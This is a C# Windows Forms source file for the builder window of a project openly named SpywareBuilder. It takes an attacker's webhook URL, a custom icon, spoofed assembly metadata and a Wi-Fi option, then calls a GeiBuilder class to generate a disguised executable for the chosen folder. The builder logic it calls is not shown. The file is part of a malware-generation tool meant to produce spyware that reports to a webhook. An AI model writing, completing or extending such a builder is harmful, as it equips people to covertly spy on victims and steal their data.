using SpywareBuilder.AssemblyInfo;
using SpywareBuilder.Builder;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SpywareBuilder.GUI
{
    public partial class BuilderForm : Form
    {
        private AssemblyData assemblyData;
        private string IconPath;
        private AssemblyInformation assemblyInformation;

        const int SHCNE_ASSOCCHANGED = 0x08000000;
        const int SHCNF_FLUSH = 0x1000;

        [DllImport("Shell32.dll")]
        private static extern int SHChangeNotify(int eventId, uint flags, IntPtr dwItem1, IntPtr dwItem2);

        public BuilderForm() => InitializeComponent();

        private void IconPreview_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Filter = "Icon Files (*.ico)|*.ico";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    if (!string.IsNullOrEmpty(dlg.FileName))
                    {
                        IconPreview.Image = Image.FromFile(dlg.FileName);
                        IconPath = dlg.FileName;
                    }
                }
            }
        }

        private void BtnAssemblyConfig_Click(object sender, EventArgs e)
        {
            using (AssemblyInformation assemblyInformation = new AssemblyInformation(assemblyData))
            {
                assemblyInformation.AssemblyInformationSaved += AssemblyInformation_AssemblyInformationSaved;
                assemblyInformation.ShowDialog();
            }
        }

        private void InitiateAssemblyInformationForm()
        {
            assemblyData = new AssemblyData();

            assemblyInformation = new AssemblyInformation(assemblyData);
            assemblyInformation.AssemblyInformationSaved += AssemblyInformation_AssemblyInformationSaved;
        }

        private void AssemblyInformation_AssemblyInformationSaved(object sender, EventArgs e)
        {
            if (e is AssemblyData data)
                assemblyData = data;
        }

        private void BtnBuild_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(TxtWebhook.Text) || string.IsNullOrEmpty(TxtOutputFolder.Text) || string.IsNullOrEmpty(IconPath))
            {
                MessageBox.Show("Error building.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            PictureBuilding.Visible = true;
            BwBuild.RunWorkerAsync();
        }

        private void BuilderForm_Load(object sender, EventArgs e)
        {
            InitiateAssemblyInformationForm();
            PictureBuilding.Visible = false;
        }

        private void BwBuild_DoWork(object sender, DoWorkEventArgs e)
        {
            if (assemblyData == null)
                return;

            GeiBuilder geiBuilder = new GeiBuilder();

            geiBuilder.Setup(TxtWebhook.Text, assemblyData, CheckBoxWifi.Checked);
            geiBuilder.Build(IconPath, TxtOutputFolder.Text);

            SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, IntPtr.Zero, IntPtr.Zero);
        }

        private void BwBuild_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            PictureBuilding.Visible = false;
            MessageBox.Show("Finished building.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void BtnBrowseOutputFolder_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog dialog = new FolderBrowserDialog())
            {
                dialog.Description = "Select a folder to save your executable";

                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    TxtOutputFolder.Text = dialog.SelectedPath;
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            PluginsForm p = new PluginsForm();
            p.ShowDialog();
        }
    }
}
